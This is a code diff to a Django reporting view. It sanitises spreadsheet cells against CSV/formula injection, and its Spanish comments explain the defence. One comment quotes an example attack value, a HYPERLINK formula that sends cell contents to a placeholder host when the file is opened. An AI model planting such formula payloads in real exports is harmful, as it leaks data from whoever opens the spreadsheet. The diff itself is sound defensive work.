@@ -14,6 +14,7 @@ from django.utils.dateparse import parse_date
 from rest_framework.views import APIView
 from rest_framework.permissions import IsAuthenticated
 from core.permissions import HasTenant, IsManager
+from core.excel_safety import sanitize_cell
 
 from reports import services
 
@@ -31,15 +32,22 @@ def _make_wb(title, headers, rows, filename):
     ws = wb.active
     ws.title = title
 
+    # Headers son siempre constantes del código — no necesitan sanitize.
     for col, h in enumerate(headers, 1):
         cell = ws.cell(row=1, column=col, value=h)
         cell.font = HEADER_FONT
         cell.fill = HEADER_FILL
         cell.alignment = HEADER_ALIGN
 
+    # CRÍTICO: cada celda de datos puede contener input del usuario
+    # (nombres de producto, notas, descripciones). sanitize_cell prefija
+    # `'` si el string empieza con `=`/`+`/`-`/`@`/\t/\r para neutralizar
+    # CSV injection (CVE-2014-3524). Sin esto, un atacante que crea un
+    # producto llamado `=HYPERLINK("http://x/?d="&A1)` puede exfiltrar
+    # datos del reporte cuando el dueño abre el XLSX.
     for r_idx, row in enumerate(rows, 2):
         for c_idx, val in enumerate(row, 1):
-            ws.cell(row=r_idx, column=c_idx, value=val)
+            ws.cell(row=r_idx, column=c_idx, value=sanitize_cell(val))
 
     for col in ws.columns:
         max_len = max(len(str(c.value or "")) for c in col)
